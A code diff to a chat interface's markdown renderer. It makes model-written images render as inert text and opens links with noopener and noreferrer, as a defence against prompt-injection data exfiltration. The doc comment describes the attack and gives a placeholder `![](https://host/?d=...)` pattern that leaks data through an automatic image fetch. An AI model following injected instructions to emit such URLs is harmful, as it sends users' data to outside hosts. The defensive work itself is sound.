@@ -1,6 +1,11 @@
 "use client";
 
-import { useEffect, useState, useSyncExternalStore } from "react";
+import {
+  useEffect,
+  useState,
+  useSyncExternalStore,
+  type ComponentPropsWithoutRef,
+} from "react";
 
 import {
   ThreadPrimitive,
@@ -25,10 +30,43 @@ import {
   type Persona,
 } from "@/lib/persona";
 
-const MarkdownText = () => (
+/** An assistant message is untrusted text. An attached document, a fetched
+ *  page, or a teammate's note can carry an instruction, and the model repeats
+ *  what it read. A rendered `![](https://host/?d=...)` fetches that URL the
+ *  moment the line paints, so whatever the agent just read leaves in the query
+ *  string with no click and no tool call — tools/_gate.py governs writes and
+ *  never sees a read leaving this way. The reference renders as inert text
+ *  instead of an <img>. next.config.ts pins img-src as the backstop for a
+ *  renderer that regresses. */
+const InertImage = ({ src, alt }: ComponentPropsWithoutRef<"img">) => (
+  <span className="text-ink-3">
+    {alt?.trim() ? `${alt.trim()} ` : ""}
+    {`(image: ${typeof src === "string" ? src : ""})`}
+  </span>
+);
+
+/** The href comes from model output, so it opens with no handle back: without
+ *  rel, the opened page reads window.opener and can navigate this tab to a
+ *  page that imitates it. react-markdown's defaultUrlTransform already drops a
+ *  javascript: href before this renders. The underline is the only thing that
+ *  marks a link here — prose-chat gives `a` no color of its own. */
+const SafeLink = ({ href, children }: ComponentPropsWithoutRef<"a">) => (
+  <a href={href} target="_blank" rel="noopener noreferrer" className="underline">
+    {children}
+  </a>
+);
+
+// hoisted: a components object built inline remounts every node on each token
+// of a streaming message
+const MARKDOWN_COMPONENTS = { img: InertImage, a: SafeLink };
+
+// exported for __tests__/chat-markdown-inert.test.tsx, which renders it with
+// the primitive shimmed: the props ARE the containment
+export const MarkdownText = () => (
   <MarkdownTextPrimitive
     remarkPlugins={[remarkGfm]}
     className="prose-chat break-words"
+    components={MARKDOWN_COMPONENTS}
   />
 );
 
